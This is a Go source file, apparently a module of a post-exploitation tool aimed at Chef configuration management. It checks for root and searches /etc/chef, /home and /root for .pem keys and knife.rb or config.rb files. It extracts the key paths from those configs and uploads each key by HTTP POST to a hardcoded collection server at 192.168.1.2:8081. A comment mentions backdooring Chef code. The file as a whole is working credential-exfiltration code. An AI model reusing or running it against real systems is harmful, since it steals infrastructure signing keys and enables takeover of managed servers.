package main

// Copyright 2019 Jayson Grace. All rights reserved
// Use of this source code is governed by a MIT-style
// license that can be found in the LICENSE file.

import (
	//"fmt"
	"bufio"
	"log"
	"os"

	"github.com/fatih/color"
	"github.com/l50/mose/pkg/utils"
	//	"path"
	//"github.com/gobuffalo/packr/v2"
	//"path/filepath"
	"regexp"
	"strings"
	//"text/template"
	"bytes"
	"io"
	"mime/multipart"
	"net/http"
	"path/filepath"
)

type FileTransfer struct {
	FileLocation string `json:"dest"`
	FileBlob     string `json:"blob"`
	IsDownload   bool   `json:"download"`
	Job          string `json:"job"`
}

type Command struct {
	ClassName string
	CmdName   string
	Cmd       string
}

type myRegexp struct {
	*regexp.Regexp
}

var (
	a          = CreateAgent()
	bdCmd      = a.BdCmd
	errmsg     = color.Red
	msg        = color.Green
	osTarget   = a.OsTarget
	moduleName = a.ModuleName
	keys       []string
)

func findChefFiles() []string {
	var chefFiles []string
	fileList := utils.GetFileList([]string{"/etc/chef", "/home", "/root"})
	for _, file := range fileList {
		if strings.HasSuffix(file, ".pem") || strings.Contains(file, "knife.rb") || strings.Contains(file, "config.rb") {
			chefFiles = append(chefFiles, file)
		}
	}
	if len(chefFiles) == 0 {
		log.Fatalln("Unable to find any chef files, exiting.")
	}
	return chefFiles
}

func locateConfig(chefFiles []string) string {
	for _, file := range chefFiles {
		if strings.Contains(file, "knife.rb") || strings.Contains(file, "config.rb") {
			return file
		}
	}
	return ""
}

// Read config file line-by-line and get the location of any pem files we need
func extractKeys(config string) []string {
	var chefKeys []string
	re := regexp.MustCompile(`.*key\s+'(.*?)'`)

	// Read file line-by-line
	file, err := os.Open(config)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	// Find the path to the keys via regex
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		res := re.FindAllStringSubmatch(scanner.Text(), -1)
		if len(res) == 1 {
			chefKeys = append(chefKeys, res[0][1])
		}
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

	if len(chefKeys) == 0 {
		log.Fatalln("No keys found, exiting.")
	}
	return chefKeys
}

// Creates a new file upload http request with optional extra params
// https://matt.aimonetti.net/posts/2013/07/01/golang-multipart-file-upload-example/
func newfileUploadRequest(uri string, params map[string]string, paramName, path string) (*http.Request, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile(paramName, filepath.Base(path))
	if err != nil {
		return nil, err
	}
	_, err = io.Copy(part, file)

	for key, val := range params {
		_ = writer.WriteField(key, val)
	}
	err = writer.Close()
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequest("POST", uri, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	return req, err
}

func transferKey(key string) {
	// TODO: Parameterize
	request, err := newfileUploadRequest("http://192.168.1.2:8081/upload", nil, "file", key)
	if err != nil {
		log.Fatal(err)
	}
	client := &http.Client{}
	resp, err := client.Do(request)
	if err != nil {
		log.Fatal(err)
	} else {
		body := &bytes.Buffer{}
		_, err := body.ReadFrom(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		resp.Body.Close()
		log.Println(resp.StatusCode)
		log.Println(resp.Header)
		log.Println(body)
	}
}

func main() {
	// TODO: Add ability to specify all chef agents or a specific one

	// If we're not root, we probably can't backdoor any of the chef code, so exit
	utils.CheckRoot()
	chefFiles := findChefFiles()

	config := locateConfig(chefFiles)
	// If a config.rb or knife.rb exists, use it to locate the keys
	if config != "" {
		keys = extractKeys(config)
		log.Printf("%v", keys)
		for _, key := range keys {
			transferKey(key)
		}
		// transfer keys to endpoint via JSON
	} else {
		for _, file := range chefFiles {
			if strings.HasSuffix(file, ".pem") {
				transferKey(file)
				// transfer keys to endpoint via JSON
				log.Printf("%v", file)
			}
		}
	}
}
